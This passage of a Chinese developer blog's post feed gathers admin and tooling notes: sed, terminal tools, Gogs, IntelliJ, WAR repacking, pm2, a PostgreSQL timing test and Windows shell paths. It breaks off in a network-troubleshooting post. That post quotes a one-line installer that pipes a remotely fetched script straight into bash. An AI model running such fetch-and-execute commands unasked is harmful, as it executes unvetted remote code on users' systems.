文件名</p><p>sed -n ‘70,75p’ date.log &nbsp; &nbsp; &nbsp; 输出第 70 行到第 75 行的内容</p><p>sed -n ‘6p;260,400p; ‘ 文件名 &nbsp; 输出第 6 行 和 260 到 400 行</p><p>sed -n 5p 文件名 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 输出第 5 行</p><p>tail 和 head 加上 -n 参数后 都代表输出到指定行数，tail 是指定行数到结尾，head 是开头到指定行数</p><p>+数字 代表整数第几行， -数字代表倒数第几行</p><h2 id="22-款终端生产力工具，效率飞起！"><a href="#22-款终端生产力工具，效率飞起！" class="headerlink" title="22 款终端生产力工具，效率飞起！"></a>22 款终端生产力工具，效率飞起！</h2><p>原文地址：<a href="https://mp.weixin.qq.com/s/ZzR-BzEwDLAkmAUxwj1szg">https://mp.weixin.qq.com/s/ZzR-BzEwDLAkmAUxwj1szg</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fish shell <span class="token comment">## 款易于上手的终端shell starship--款强大的shell提示工具</span>z <span class="token comment">## 一个快速切换文件路径的命令工具</span>fzf <span class="token comment">## 一款好用的模糊查找工具</span>fd <span class="token comment">## 升级版的find 查找工具</span>ripgrep <span class="token comment">## like grep but better 升级版的grep工具</span><span class="token function">htop</span> and glances <span class="token comment">## 一款给力的系统监控工具</span>virtualenv and virtualfish <span class="token comment">## Python虚拟环境管理工具</span>pyenv，nodenv，and rbenv <span class="token comment">## 一款对Python，Nodel以及Ruby进行不同版本管理的工具</span>pipx  <span class="token comment">## 一款Python依赖管理以及环境管理工具</span>ctop and lazydocker <span class="token comment">## 一款给力的Docker监控工具</span>homebrew <span class="token comment">## 一款MacoS下的软件包管理工具</span>ascinema <span class="token comment">## 一款终端会话记录工具，支持从动画中进行拷贝</span>colordiff and diff-so-fancy  <span class="token comment">## 升级版的diff工具</span>tree <span class="token comment">## 一款用于展示目录树状结构的命令工具</span>bat <span class="token comment">## 一款升级版的cat工具</span>httpie <span class="token comment">## 一款升级版的curl工具</span>tldr <span class="token comment">## Too long，Don't read，简化版的man pages查看工具。</span>exa <span class="token comment">## 一款升级版的ls命令工具</span>litecli and pgcli <span class="token comment">## 升级版的sqlite3和psql数据库连接工具</span>mas <span class="token comment">## App Store的命令行工具</span>ncdu <span class="token comment">## 一款磁盘使用分析的命令行工具</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1604488201448-ed591af6-84b6-4b7d-a0e3-f7a5c19142cd.png#height=746&amp;id=dxOHB&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=746&amp;originWidth=1066&amp;originalType=binary%E2%88%B6=1&amp;size=617876&amp;status=done&amp;style=none&amp;width=1066" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次同事直接删除gogs数据库中用户导致的问题</title>
      <link href="/2020/04/18/yuque/ah0sig/"/>
      <url>/2020/04/18/yuque/ah0sig/</url>
      
        <content type="html"><![CDATA[<p>有一次同事的 gogs 账号无法登陆了，他想着看下数据库中的密码，解密没成功，他也无法以他的名字新建账号，就直接在数据库的用户表中删除了自己的用户，接着导致的 gogs 的一些功能无法使用（500）的问题，比如管理项目的协作者（分析为找不到指定用户）。</p><p>1.首先说下他的账号为啥无法登陆的问题，这个问题是 win 系统下常见的一个问题，是 win 下的 Windows 凭据导致的，删除和 gogs 服务相关的凭据重新登录就好了。</p><p>2.再说下 gogs 某些功能无法使用的解决方法（继续删除数据，嘿嘿），对啊，他只删除用户数据肯定是不行的，因为其他的好多表都在使用用户表的数据，还需要把使用用户数据的表中把和他相关的数据一并删掉，经过分析：</p><pre class="line-numbers language-none"><code class="language-none">项目表为：action协作表为：collaboration组织中包含的人员表：org_user从中删掉user_id为他之前用户的id的相关数据就好了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于工作比较忙，这里没进一步研究，只是把他的新用户添加到项目的协作列表让他能够使用就完了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>更新Idea2020.1打开提示Cannot load a JDK class：com.sun.jdi.Field</title>
      <link href="/2020/04/18/yuque/gc9f2w/"/>
      <url>/2020/04/18/yuque/gc9f2w/</url>
      
        <content type="html"><![CDATA[<p>一启动就会提示下图，点击确定程序就会退出：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1587175348624-a83ae832-3519-4fef-a22a-db05b87cf4dd.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=276&amp;originWidth=593&amp;size=161601&amp;status=done&amp;style=none&amp;width=593" alt="image.png"><br>在网上查到的方法基本上都是让修改环境变量，配置到 Idea 目录下的 jbr，但是这种方法对我却不起作用，</p><pre class="line-numbers language-none"><code class="language-none">这个问题一直困扰了我好久，后来查询stackoverflow找到解决办法，是c:\Users\&lt;user&gt;\AppData\Roaming\JetBrains\IntelliJIdea2020.1\idea64.exe.jdk这个文件中配置的jdk的目录不正确导致的，我这里可能是之前无意间修改成了本机安装的jdk8.把这个文件删除之后就可以打开了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">参考地址：（没解决）https://blog.csdn.net/whzhaochao/article/details/105539961（解决）https://stackoverflow.com/questions/61145290/intellij-idea-doesnt-start-cannot-load-a-jdk-class-com-sun-jdi-fieldhttps://www.jetbrains.com/help/idea/2020.1/tuning-the-ide.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次项目部署后缺少一个文件（替换文件）的解决思路</title>
      <link href="/2020/04/11/yuque/uo85sn/"/>
      <url>/2020/04/11/yuque/uo85sn/</url>
      
        <content type="html"><![CDATA[<p>1.原本想的是进入容器后，找到 springboot 项目的 war 包执行是释放到的临时目录，把缺少的文件添加进去，结果在网上查了一下只有关于运行时操作产生的临时文件的目录，并没找到解包的目录。</p><p>2.然后就想到了像解压压缩包一样解压 war 包再重新打包的方法，下面的用到的命令，详细过程就不列举了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 方法一 将war包解压到当前文件夹</span>jar -xvf app.war -C ./unapp/<span class="token comment">#将当前文件夹下所有内容打成war包</span>jar -cvfM0 app.war ./unapp/<span class="token comment"># 其中：</span><span class="token comment"># x 解包</span><span class="token comment"># c 打包</span><span class="token comment"># v 显示过程信息</span><span class="token comment"># 0 这个是阿拉伯数字，只打包不压缩的意思</span><span class="token comment"># 方法二 以下为替换文件的思路</span><span class="token comment"># 1. 先用jar -tvf {war | jar} 看一下文件中 要替换文件的路径</span><span class="token comment"># 2. 用jar -xvf {war | jar} {dest} 解压出要替换的文件，包括文件所在的目录路径</span><span class="token comment"># 3. 再将新文件替换解压之后的目录结构中的文件</span><span class="token comment"># 4. 最后 jar -uvf  {war | jar}  {dest}</span><span class="token comment"># 方法三 还可以使用 unzip解压 和zip 进行打包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解包后我这里是使用的 wget 把缺少的文件下载到容器中的，如果大家不嫌麻烦当然也可以先 scp 到宿主机在 copy 到容器中，方法很多种，大家方便高兴为妙。</p><p>打包后重启容器就 ok 了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux后台运行node脚本的方式</title>
      <link href="/2020/03/17/yuque/mgo1ci/"/>
      <url>/2020/03/17/yuque/mgo1ci/</url>
      
        <content type="html"><![CDATA[<h2 id="1-nohup（系统自带），不只适用于-node，命令行脚本-服务都可以用"><a href="#1-nohup（系统自带），不只适用于-node，命令行脚本-服务都可以用" class="headerlink" title="1.nohup（系统自带），不只适用于 node，命令行脚本/服务都可以用"></a>1.<strong>nohup（系统自带），不只适用于 node，命令行脚本/服务都可以用</strong></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">##用法 nohup 要执行的命令 &amp; ，然后exit 命令退出命令行即可，千万不要直接关闭，不然服务会停掉。</span><span class="token comment">##默认会在当前目录生成output.log日志文件，可在&amp;前使用“&gt;文件路径”来保存为指定文件。（）</span><span class="token comment">#例子：</span><span class="token variable">$nohup</span> node servier.js <span class="token operator">&amp;</span> //默认日志<span class="token variable">$nohup</span> node servier.js <span class="token operator">&gt;</span> ./log.txt <span class="token operator">&amp;</span> //自定义日志<span class="token variable">$exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-forever"><a href="#2-forever" class="headerlink" title="2.forever"></a>2.forever</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装forever</span><span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> forever -g<span class="token comment">#启动进程</span>forever start ./server.js<span class="token comment">#关闭进程</span>forever stop ./server.js<span class="token comment">#输出日志</span>forever start -l forever.log -o out.log -e err.log ./server.js<span class="token comment">#查看forever进程列表</span>forever list<span class="token comment">#重启进程</span>forever restart ./bin/www<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**</p><h2 id="3-pm2"><a href="#3-pm2" class="headerlink" title="3.pm2"></a>3.pm2</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装pm2</span><span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> pm2 -g<span class="token comment">##常用命令</span>$ pm2 start app.js <span class="token comment"># 启动app.js应用程序</span>$ pm2 start app.js –name<span class="token operator">=</span>”api” <span class="token comment"># 启动应用程序并命名为 “api”</span>$ pm2 start app.js –watch <span class="token comment"># 当文件变化时自动重启应用</span>$ pm2 start script.sh <span class="token comment"># 启动 bash 脚本</span>$ pm2 list <span class="token comment"># 列表 PM2 启动的所有的应用程序</span>$ pm2 monit <span class="token comment"># 显示每个应用程序的CPU和内存占用情况</span>$ pm2 show <span class="token punctuation">[</span>app-name<span class="token punctuation">]</span> <span class="token comment"># 显示应用程序的所有信息</span>$ pm2 logs <span class="token comment"># 显示所有应用程序的日志</span>$ pm2 logs <span class="token punctuation">[</span>app-name<span class="token punctuation">]</span> <span class="token comment"># 显示指定应用程序的日志</span>$ pm2 stop all <span class="token comment"># 停止所有的应用程序</span>$ pm2 stop <span class="token number">0</span> <span class="token comment"># 停止 id为 0的指定应用程序</span>$ pm2 restart all <span class="token comment"># 重启所有应用</span>$ pm2 reload all <span class="token comment"># 重启 cluster mode下的所有应用</span>$ pm2 gracefulReload all <span class="token comment"># 优雅地在集群模式下重新加载所有应用程序</span>$ pm2 delete all <span class="token comment"># 关闭并删除所有应用</span>$ pm2 delete <span class="token number">0</span> <span class="token comment"># 删除指定应用 id 0</span>$ pm2 scale api <span class="token number">10</span> <span class="token comment"># 把名字叫api的应用扩展到10个实例</span>$ pm2 reset <span class="token punctuation">[</span>app-name<span class="token punctuation">]</span> <span class="token comment"># 重置重启数量</span>$ pm2 startup <span class="token comment"># 创建开机自启动命令</span>$ pm2 save <span class="token comment"># 保存当前应用列表</span>$ pm2 resurrect <span class="token comment"># 重新加载保存的应用列表</span>$ pm2 update <span class="token comment"># 保存进程、杀死PM2和恢复进程</span>$ pm2 generate <span class="token comment"># 生成样本json配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通过使用100万条数据来测试字段的多少是否会影响查询的速度</title>
      <link href="/2020/02/19/yuque/xdqhiz/"/>
      <url>/2020/02/19/yuque/xdqhiz/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">create</span> <span class="token keyword">database</span> test<span class="token punctuation">;</span><span class="token keyword">drop</span>  <span class="token keyword">table</span>  <span class="token keyword">if</span> <span class="token keyword">exists</span> small_field_data<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> small_field_data<span class="token punctuation">(</span>    id          <span class="token keyword">bigint</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    project_id  <span class="token keyword">bigint</span><span class="token punctuation">,</span>    model_id    <span class="token keyword">bigint</span><span class="token punctuation">,</span>    floor       <span class="token keyword">smallint</span><span class="token punctuation">,</span>    <span class="token keyword">top</span>         <span class="token keyword">double</span> <span class="token keyword">precision</span><span class="token punctuation">,</span>    bottom      <span class="token keyword">double</span> <span class="token keyword">precision</span><span class="token punctuation">,</span>    create_data <span class="token keyword">timestamp</span> <span class="token keyword">default</span> <span class="token boolean">NULL</span>::<span class="token keyword">timestamp</span> without <span class="token keyword">time</span> <span class="token keyword">zone</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 创建模拟数据</span><span class="token keyword">start</span> <span class="token keyword">transaction</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> small_field_data <span class="token keyword">select</span> generate_series<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">round</span><span class="token punctuation">(</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">,</span>                                    random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10.11</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10.12</span><span class="token punctuation">;</span><span class="token keyword">commit</span><span class="token punctuation">;</span><span class="token keyword">select</span> floor <span class="token keyword">from</span> small_field_data <span class="token keyword">where</span> project_id <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token keyword">distinct</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span> <span class="token keyword">from</span> small_field_data<span class="token punctuation">;</span><span class="token keyword">drop</span>  <span class="token keyword">table</span>  <span class="token keyword">if</span> <span class="token keyword">exists</span> great_field_data<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> great_field_data<span class="token punctuation">(</span>    id          <span class="token keyword">bigint</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    project_id  <span class="token keyword">bigint</span><span class="token punctuation">,</span>    model_id    <span class="token keyword">bigint</span><span class="token punctuation">,</span>    floor       <span class="token keyword">smallint</span><span class="token punctuation">,</span>    <span class="token keyword">top</span>         <span class="token keyword">double</span> <span class="token keyword">precision</span><span class="token punctuation">,</span>    bottom      <span class="token keyword">double</span> <span class="token keyword">precision</span><span class="token punctuation">,</span>    dbid        <span class="token keyword">bigint</span><span class="token punctuation">,</span>    <span class="token keyword">name</span>        <span class="token keyword">text</span><span class="token punctuation">,</span>    specialty   <span class="token keyword">text</span><span class="token punctuation">,</span>    create_data <span class="token keyword">timestamp</span> <span class="token keyword">default</span> <span class="token boolean">NULL</span>::<span class="token keyword">timestamp</span> without <span class="token keyword">time</span> <span class="token keyword">zone</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 创建模拟数据</span><span class="token keyword">start</span> <span class="token keyword">transaction</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> great_field_data <span class="token keyword">select</span> generate_series<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">round</span><span class="token punctuation">(</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">,</span>                                    random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10.11</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10.12</span><span class="token punctuation">,</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">11</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>::<span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>::<span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">commit</span><span class="token punctuation">;</span><span class="token keyword">select</span> floor <span class="token keyword">from</span> great_field_data <span class="token keyword">where</span> project_id <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token keyword">distinct</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span> <span class="token keyword">from</span> great_field_data<span class="token punctuation">;</span><span class="token comment">-- 不太好进行具体的测试，外界影响因素太多（其他程序占用资源，系统占用资源，程序卡顿等等）</span><span class="token comment">-- 多次测试结果如下(ms)：</span><span class="token comment">-- on   small_field_data               great_field_data</span><span class="token comment">-- sql   1           2                  1            2</span><span class="token comment">-- 0    126         230                139          238</span><span class="token comment">-- 1    130         230                134          238</span><span class="token comment">-- 2    129         210                123          268</span><span class="token comment">-- 3    125         230                125          238</span><span class="token comment">-- 4    162         235                129          227</span><span class="token comment">-- 5    116         271                133          230</span><span class="token comment">-- 6    132         237                124          229</span><span class="token comment">-- 7    120         230                124          258</span><span class="token comment">-- 8    140         216                122          236</span><span class="token comment">-- 9    118         229                132          225</span><span class="token comment">-- 通过上方数据可看出,字段少的时候略快于字段多的时候,但现在的电脑配置都很给力,差异并不是很明显.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>所有Windows 10 Shell命令的完整列表(汉化注释)</title>
      <link href="/2020/02/18/yuque/yreq7w/"/>
      <url>/2020/02/18/yuque/yreq7w/</url>
      
        <content type="html"><![CDATA[<p>Windows&nbsp;10 中的 Shell 命令列表<br>首先，您需要按住“&nbsp;Windows”按钮和“&nbsp;R”按钮以调出“运行”窗口。<br>在“运行”窗口中，您需要写下以下命令之一，然后按“&nbsp;Enter”按钮以访问特定功能。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">:: Windows <span class="token number">10</span> Shell commands:“shell:AccountPictures” :: 此命令访问Windows <span class="token number">10</span>设备中的帐户图片文件夹。“shell:AddNewProgramsFolder” :: 添加一个新的程序文件夹。“shell:Administrative Tools” :: 访问管理工具文件夹。“shell:AppData” :: 访问Windows <span class="token number">10</span>系统中的AppData文件夹。“shell:Application Shortcuts” :: 访问“应用程序快捷方式”文件夹。“shell:AppsFolder” :: 访问Apps文件夹。“shell:AppUpdatesFolder” :: 访问Apps更新文件夹。“shell:Cache” :: 访问缓存文件夹。“shell:Camera Roll” :: 访问相机胶卷文件夹。“shell:CD Burning” :: 访问临时刻录文件夹。“shell:ChangeRemoveProgramsFolder” :: 访问删除/更改程序文件夹。“shell:Common Administrative Tools” :: 访问管理工具文件夹。“shell:Common AppData” :: 访问Common AppData文件夹。“shell:Common Desktop” :: 访问公用桌面文件夹。“shell:Common Documents” :: 访问“公共文档”文件夹。“shell:Common Programs” :: 访问程序文件夹。“shell:Common Start Menu” :: 访问开始菜单文件夹。“shell:Common Startup” :: 访问Windows <span class="token number">10</span>系统中的“启动”文件夹。“shell:Common Templates” :: 访问“通用模板”文件夹。“shell:CommonDownloads” :: 访问下载文件夹。“shell:CommonMusic” :: 访问音乐文件夹。“shell:CommonPictures” :: 访问“图片”文件夹。“shell:CommonRingtones” :: 访问铃声文件夹。“shell:CommonVideo” :: 访问公共的“视频”文件夹。“shell:ConflictFolder” :: 访问Windows <span class="token number">10</span>系统中的“冲突”文件夹。“shell:ConnectionsFolder” :: 打开连接文件夹“shell:Contacts” :: 打开联系人文件夹“shell:ControlPanelFolder” :: 打开控制面板文件夹。“shell:Cookies” :: 打开Cookies文件夹。“shell:CredentialManager” :: 打开凭据管理器功能。“shell:CryptoKeys” :: 打开加密密钥文件夹“shell:CSCFolder” :: 打开CSC文件夹。“shell:Desktop” :: 打开桌面文件夹。“shell:Device Metadata Store” :: 打开元数据存储文件夹。“shell:DocumentsLibrary” :: 打开文档库文件夹“shell:Downloads” :: 打开下载文件夹“shell:DpapiKeys” :: 打开DpapiKeys文件夹“shell:Favorites” :: 打开收藏夹文件夹。“shell:Fonts” :: 打开字体文件夹。“shell:Games” :: 打开游戏文件夹。“shell:GameTasks” :: 打开游戏任务文件夹“shell:History” :: 打开历史记录文件夹“shell:HomeGroupCurrentUserFolder” :: 打开当前用户的家庭组文件夹。“shell:HomeGroupFolder” :: 打开家庭组文件夹。“shell:ImplicitAppShortcuts” :: 打开“隐式应用程序”快捷方式文件夹。“shell:InternetFolder” :: 打开Internet文件夹。“shell:Libraries” :: 打开库文件夹。“shell:Links” :: 打开链接文件夹。“shell:Local AppData” :: 打开本地AppData文件夹。“shell:LocalAppDataLow” :: 打开本地AppDataLow文件夹.“shell:LocalizedResourcesDir” :: 打开本地化资源文件夹.“shell:MAPIFolder” :: 打开MAPI文件夹.“shell:MusicLibrary” :: 打开Lusic Library文件夹。“shell:My Music” :: 打开我的音乐文件夹。“shell:My Video” :: 打开我的视频文件夹。“shell:MyComputerFolder” :: 打开我的电脑文件夹。“shell:NetHood” :: 打开Net Hood文件夹。“shell:NetworkPlacesFolder” :: 打开网上邻居文件夹。“shell:OEM Links” :: 打开OEM链接文件夹。“shell:OneDrive” :: 在Windows <span class="token number">10</span>中打开OneDrive文件夹“shell:Original Images” :: 打开原始图像文件夹。“shell:Personal” :: 打开个人文件夹。“shell:PhotoAlbums” :: 打开相簿文件夹。“shell:PicturesLibrary” :: 打开PicturesLibrary文件夹。“shell:Playlists” :: 打开播放列表文件夹。“shell:PrintersFolder” :: 打开打印机文件夹。“shell:PrintHood” :: 打开PrintHood文件夹。“shell:Profile” :: 打开配置文件文件夹。“shell:ProgramFiles” :: 打开ProgramFiles文件夹。“shell:ProgramFilesCommon”:: 打开ProgramFilesCommon文件夹。“shell:ProgramFilesCommonX64” :: 打开ProgramFilesCommonX64文件夹。“shell:ProgramFilesCommonX86” :: 打开ProgramFilesCommonX86文件夹。“shell:ProgramFilesX64” :: 打开ProgramFilesX64文件夹。“shell:ProgramFilesX86” :: 打开ProgramFilesX86文件夹。“shell:Programs” :: 打开程序文件夹。“shell:Public” :: 打开公用文件夹。“shell:PublicAccountPictures” :: 打开“公共帐户图片”文件夹。“shell:PublicGameTasks” :: 打开公共游戏任务文件夹。“shell:PublicLibraries” :: 打开公共图书馆文件夹。“shell:Quick Launch” :: 打开快速启动文件夹。“shell:Recent” :: 打开最近的项目文件夹“shell:RecordedTVLibrary” :: 在Windows <span class="token number">10</span>系统中打开记录器文件“shell:RecycleBinFolder” :: 打开系统回收站文件夹“shell:ResourceDir” :: 打开资源文件夹“shell:Retail Demo” :: 打开演示文件夹“shell:Ringtones” :: 在Windows <span class="token number">10</span>中打开铃声文件夹“shell:Roamed Tile Images” :: 打开“Roaming Tiles图像”文件夹“shell:Roaming Tiles” :: 打开Roaming Tiles文件夹“shell:SavedGames” :: 它将打开Windows <span class="token number">10</span>系统中的保存的游戏文件夹“shell:Screenshots” :: 打开Screenshots文件夹“shell:Searches” :: 打开搜索文件夹。“shell:SearchHistoryFolder” :: 打开系统中的“搜索历史记录”文件夹。“shell:SearchHomeFolder” :: 打开搜索主文件夹。“shell:SearchTemplatesFolder” :: 打开搜索模板文件夹。“shell:SendTo” :: 打开SendTo文件夹。“shell:SkyDriveCameraRoll” :: 打开SkyDriveCameraRoll文件夹。“shell:SkyDriveMusic” :: 打开SkyDrive音乐文件夹。“shell:SkyDrivePictures” :: 打开SkyDrive图片文件夹。“shell:Start Menu” :: 打开“开始”菜单文件夹。“shell:StartMenuAllPrograms” :: 打开开始菜单中的所有程序文件夹。“shell:Startup” :: 打开启动文件夹。“shell:SyncCenterFolder” :: 打开SyncCenter文件夹。“shell:SyncResultsFolder” :: 打开SyncResults文件夹。“shell:SyncSetupFolder” :: 打开SyncSetup文件夹。“shell:System” :: 打开系统文件夹。“shell:SystemCertificates” :: 打开SystemCertificates文件夹。“shell:SystemX86” :: 打开SystemX86文件夹。“shell:Templates” :: 打开模板文件夹。“shell:ThisPCDesktopFolder” :: 打开ThisPCDesktop文件夹。“shell:User Pinned” :: 打开用户固定文件夹。“shell:UserProfiles” :: 打开用户配置文件文件夹。“shell:UserProgramFiles” :: 打开程序文件文件夹。“shell:UserProgramFilesCommon” :: 打开程序文件公用文件夹。“shell:UsersFilesFolder” :: 从您登录时使用的特定用户打开“文件”文件夹。“shell:UsersLibrariesFolder” :: 打开特定用户的库文件夹。“shell:VideosLibrary” :: 打开视频库文件夹。“shell:Windows” :: 打开“ Windows”文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得一提的是，您也可以在 CMD 和 File&nbsp;Explorer 中使用上面列出的命令。<br>如果您喜欢 CMD，只需键入 start，然后添加要运行的 Shell 命令。<br>在文件资源管理器中，您可以使用地址栏输入上面列出的命令。<br>有了它，即可快速访问运行窗口以及 Windows&nbsp;10 操作系统中的所有可用 Shell 命令。<br>如果您对本指南有任何疑问，请在下面的评论中告诉我们，我们将尽快为您提供帮助。</p><p>原文地址：<a href="https://windowsreport.com/shell-commands-windows-10/">https://windowsreport.com/shell-commands-windows-10/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务器网络故障-安装 某某控制管理面板遇到的</title>
      <link href="/2020/02/02/yuque/ouowrh/"/>
      <url>/2020/02/02/yuque/ouowrh/</url>
      
        <content type="html"><![CDATA[<p>在使用下面的一键安装命令，安装 某某面板 时，回车后没任何输出，单执行“curl -Ls <a href="https://blog.xxx.xyz/xxi.sh%E2%80%9D%E4%B9%9F%E6%98%AF%E6%B2%A1%E4%BB%BB%E4%BD%95%E8%BE%93%E5%87%BA%E5%92%8C%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E3%80%82%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8wget%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%E4%B9%9F%E6%98%AF%E6%97%A0%E6%8F%90%E7%A4%BA%E3%80%82">https://blog.xxx.xyz/xxi.sh”也是没任何输出和错误提示。然后使用wget进行下载也是无提示。</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> -Ls https://blog.xxx.xyz/xxi.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>刚开始我想着可能是由于 curl 和 wget 版本太低的问题，结果使用 apt 更新发现已是最新版本，使用“apt-get&nbsp;updata”命令提示一堆错误。我以为是更新源出问题了呢，各种替换更新源，依旧是报错。</p><p>后来查询“wget: unable to resolve host address”相关的错误信息才知道是 